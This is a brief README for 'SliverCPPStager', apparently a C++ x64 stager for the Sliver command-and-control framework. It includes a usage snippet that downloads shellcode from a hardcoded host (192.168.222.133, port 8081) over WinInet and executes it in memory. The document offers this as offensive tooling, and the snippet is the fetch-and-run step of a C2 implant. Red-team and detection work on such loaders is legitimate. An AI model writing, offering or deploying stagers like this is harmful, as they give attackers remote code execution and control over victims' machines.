# SliverCPPStager

Simple stager for sliver c2 , for x64. Uses WinInet for downloading and uses the simplest shellcode execution 


Simple to use. Import the classes and call them with this code 
```cpp
  ShellcodeLoader loader;
  ShellCode shellcode = loader.Download(L"192.168.222.133", 8081);

  loader.ExecuteShellcode(shellcode);
```
